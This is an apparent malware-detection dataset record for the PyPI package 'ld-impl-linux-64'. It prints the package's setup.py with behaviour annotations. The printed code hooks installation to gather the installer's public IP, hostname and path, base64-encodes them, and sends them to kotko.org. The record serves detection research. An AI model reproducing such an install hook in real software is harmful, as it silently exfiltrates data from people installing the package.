{
  "metadata": {
    "package_name": "ld-impl-linux-64",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/ld-impl-linux-64.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/ld-impl-linux-64.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import atexit\nimport requests\nimport os\nimport pathlib\nimport base64\nfrom distutils.command.install import install\n\ncompany = \"pypi+\"+\"google-research/google-research\"+\"+\"\nname = \"ld_impl_linux-64\"\n\nclass new_install(install):\n    def __init__(self, *args, **kwargs):\n        super(new_install, self).__init__(*args, **kwargs)\n        atexit.register(_post_install)\n\ndef _post_install():\n    file_name = 'bykotko.txt'\n    f = open(file_name, 'a+')  # open file in append mode\n    f.write('kotko')\n    f.close()\n\n    ip = requests.get('https://api.ipify.org').text\n    ipText = format(ip);\n    myhost = os.uname()[1]\n    currentPath = requests.utils.quote(bytes(pathlib.Path(__file__).parent.absolute()));\n\n    PYdata = { \"ip\": ipText,\n               \"host\": myhost,\n               \"path\": currentPath, }\n    PYdataS = ipText+\",\"+myhost+\",(\"+currentPath+\")\"\n\n    message = PYdataS\n    message_bytes = message.encode('ascii')\n    base64_bytes = base64.b64encode(message_bytes)\n    base64_message = base64_bytes.decode('ascii')\n\n    r  = requests.get(\"https://kotko.org?\"+company+name+\"=\"+base64_message)\n",
          "triple_sequences": [
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "bykotko.txt",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "kotko",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://api.ipify.org",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.uname()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "pathlib.Path().parent.absolute()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "__file__",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "requests.utils.quote()",
              "action_description": "Percent-encodes bytes for use in URL",
              "action_id": "percent_encode_url",
              "object": "bytes(pathlib.Path(__file__).parent.absolute())",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "message",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "base64.b64encode()",
              "action_description": "Encodes bytes to base64-encoded bytes",
              "action_id": "encode_bytes_to_base64",
              "object": "message_bytes",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare base64-encoded data for transmission",
              "intention_id": "prepare_base64_data_transmission"
            },
            {
              "action_api": "bytes.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "base64_bytes",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://kotko.org?+pypi+google-research/google-research++ld_impl_linux-64=base64_message",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            },
            {
              "action_api": "atexit.register()",
              "action_description": "Registers function to be called at program exit",
              "action_id": "register_exit_function",
              "object": "_post_install",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger post-installation logic",
              "intention_id": "trigger_post_installation_logic"
            }
          ]
        }
      ]
    }
  ]
}